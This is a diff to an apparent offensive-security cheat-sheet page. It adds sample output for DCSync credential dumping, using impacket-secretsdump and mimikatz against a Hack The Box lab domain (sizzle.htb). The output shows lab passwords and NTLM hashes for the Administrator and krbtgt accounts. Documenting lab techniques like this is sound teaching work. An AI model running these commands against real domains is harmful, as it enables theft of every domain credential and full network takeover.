@@ -332,11 +332,69 @@ body.dark-mode #dynamicFormContainer button:hover {
 
 <div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> With creds
 </span></span><span class="line"><span class="cl"><span class="go">impacket-secretsdump -just-dc &#39;&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;TARGET&gt;&#39;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> impacket-secretsdump -just-dc <span class="s1">&#39;mrlky:Football#7@10.10.10.103&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="go">Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Using the DRSUAPI method to get NTDS.DIT secrets
+</span></span></span><span class="line"><span class="cl"><span class="go">Administrator:500:aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267:::
+</span></span></span><span class="line"><span class="cl"><span class="go">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span></span></span><span class="line"><span class="cl"><span class="go">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:296ec447eee58283143efbd5d39408c8:::
+</span></span></span><span class="line"><span class="cl"><span class="go">...[SNIP]...
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Cleaning up...
 </span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> With hashes
-</span></span><span class="line"><span class="cl"><span class="go">impacket-secretsdump -hashes &lt;HASH&gt; -just-dc &#39;&lt;DOMAIN&gt;/&lt;USER&gt;@&lt;TARGET&gt;&#39;
+</span></span><span class="line"><span class="cl"><span class="go">impacket-secretsdump -hashes :&lt;HASH&gt; -just-dc &#39;&lt;DOMAIN&gt;/&lt;USER&gt;@&lt;TARGET&gt;&#39;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> impacket-secretsdump -hashes :bceef4f6fe9c026d1d8dec8dce48adef -just-dc <span class="s1">&#39;sizzle.htb/mrlky@10.10.10.103&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="go">Impacket v0.12.0.dev1+20240730.164349.ae8b81d7 - Copyright 2023 Fortra
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Using the DRSUAPI method to get NTDS.DIT secrets
+</span></span></span><span class="line"><span class="cl"><span class="go">Administrator:500:aad3b435b51404eeaad3b435b51404ee:f6b7160bfc91823792e0ac3a162c9267:::
+</span></span></span><span class="line"><span class="cl"><span class="go">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span></span></span><span class="line"><span class="cl"><span class="go">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:296ec447eee58283143efbd5d39408c8:::
+</span></span></span><span class="line"><span class="cl"><span class="go">...[SNIP]...
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Cleaning up...
 </span></span></span></code></pre></div></div>
 
-<div class="tabcontent" data-tabset="set1" data-tabcontent="tab2"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\mimikatz.exe &#39;lsadump::dcsync /domain:&lt;DOMAIN&gt; /user:administrator&#39; exit
+<div class="tabcontent" data-tabset="set1" data-tabcontent="tab2"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\mimikatz.exe &#34;lsadump::dcsync /domain:&lt;DOMAIN&gt; /user:administrator&#34; &#34;exit&#34;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">PS C:\programdata&gt; .\mimikatz.exe &#34;lsadump::dcsync /domain:HTB.LOCAL /user:administrator&#34; &#34;exit&#34;
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">  .#####.   mimikatz 2.2.0 (x64) #19041 May 17 2024 22:19:06
+</span></span></span><span class="line"><span class="cl"><span class="go"> .## ^ ##.  &#34;A La Vie, A L&#39;Amour&#34; - (oe.eo)
+</span></span></span><span class="line"><span class="cl"><span class="go"> ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+</span></span></span><span class="line"><span class="cl"><span class="go"> ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz
+</span></span></span><span class="line"><span class="cl"><span class="go"> &#39;## v ##&#39;       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+</span></span></span><span class="line"><span class="cl"><span class="go">  &#39;#####&#39;        &gt; https://pingcastle.com / https://mysmartlogon.com ***/
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">mimikatz(commandline) # lsadump::dcsync /domain:HTB.LOCAL /user:administrator
+</span></span></span><span class="line"><span class="cl"><span class="go">[DC] &#39;HTB.LOCAL&#39; will be the domain
+</span></span></span><span class="line"><span class="cl"><span class="go">[DC] &#39;sizzle.HTB.LOCAL&#39; will be the DC server
+</span></span></span><span class="line"><span class="cl"><span class="go">[DC] &#39;administrator&#39; will be the user account
+</span></span></span><span class="line"><span class="cl"><span class="go">[rpc] Service  : ldap
+</span></span></span><span class="line"><span class="cl"><span class="go">[rpc] AuthnSvc : GSS_NEGOTIATE (9)
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Object RDN           : Administrator
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">** SAM ACCOUNT **
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">SAM Username         : Administrator
+</span></span></span><span class="line"><span class="cl"><span class="go">Account Type         : 30000000 ( USER_OBJECT )
+</span></span></span><span class="line"><span class="cl"><span class="go">User Account Control : 00000200 ( NORMAL_ACCOUNT )
+</span></span></span><span class="line"><span class="cl"><span class="go">Account expiration   : 
+</span></span></span><span class="line"><span class="cl"><span class="go">Password last change : 7/12/2018 1:32:41 PM
+</span></span></span><span class="line"><span class="cl"><span class="go">Object Security ID   : S-1-5-21-2379389067-1826974543-3574127760-500
+</span></span></span><span class="line"><span class="cl"><span class="go">Object Relative ID   : 500
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Credentials:
+</span></span></span><span class="line"><span class="cl"><span class="go">  Hash NTLM: f6b7160bfc91823792e0ac3a162c9267
+</span></span></span><span class="line"><span class="cl"><span class="go">    ntlm- 0: f6b7160bfc91823792e0ac3a162c9267
+</span></span></span><span class="line"><span class="cl"><span class="go">    ntlm- 1: c718f548c75062ada93250db208d3178
+</span></span></span><span class="line"><span class="cl"><span class="go">    lm  - 0: 336d863559a3f7e69371a85ad959a675
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">...[SNIP]...
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">mimikatz(commandline) # exit
+</span></span></span><span class="line"><span class="cl"><span class="go">Bye!
 </span></span></span></code></pre></div></div></p>
 
 </div></div>
